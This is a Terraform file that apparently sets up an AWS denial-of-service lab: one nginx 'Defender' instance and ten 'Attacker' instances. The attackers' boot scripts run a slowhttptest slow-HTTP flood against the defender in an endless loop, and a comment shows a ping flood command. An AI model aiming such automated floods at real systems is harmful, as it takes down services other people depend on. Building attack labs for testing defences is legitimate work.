resource "aws_instance" "defender_instance" {
  vpc_security_group_ids = [aws_security_group.defenders_security_group.id]
  ami                    = coalesce(var.ami, data.aws_ami.latest_ubuntu.id)
  instance_type          = var.inst_type
  subnet_id              = aws_subnet.defenders_public_subnet.id
  user_data = base64encode(<<-EOT
   #!/bin/bash
    apt-get update -y
    apt-get install nginx -y
    ufw allow 80
    apt-get install slowhttptest -y
EOT
)
  tags = {
    Name = "Defender"
  }
}


#ping $TARGET_IP -S 65000 -i 0.0000001
resource "aws_instance" "atatckers_instance" {
  count                  = 10
  vpc_security_group_ids = [aws_security_group.defenders_security_group.id]
  ami                    = coalesce(var.ami, data.aws_ami.latest_ubuntu.id)
  instance_type          = var.inst_type_attack
  subnet_id              = aws_subnet.defenders_sub_public_subnet.id

  user_data = <<-EOT
    #!/bin/bash
    sudo apt-get update
    sudo apt-get install slowhttptest -y
    sudo apt-get install -y hping3
    TARGET_IP="${aws_instance.defender_instance.public_ip}" # Dynamically fetch defender's IP
    echo "Target IP: $TARGET_IP" > /home/ubuntu/target_ip.txt
   
    while true; do 
    sudo slowhttptest -H -u http://$TARGET_IP -t GET -c 100 -r 30 -p 20 -l 3600 
    sleep 90
    done
  EOT

  depends_on = [
    aws_instance.defender_instance
  ]

  tags = {
    Name        = "Attacker_instance_number${count.index + 1}"
    Environment = "dev"
  }
}



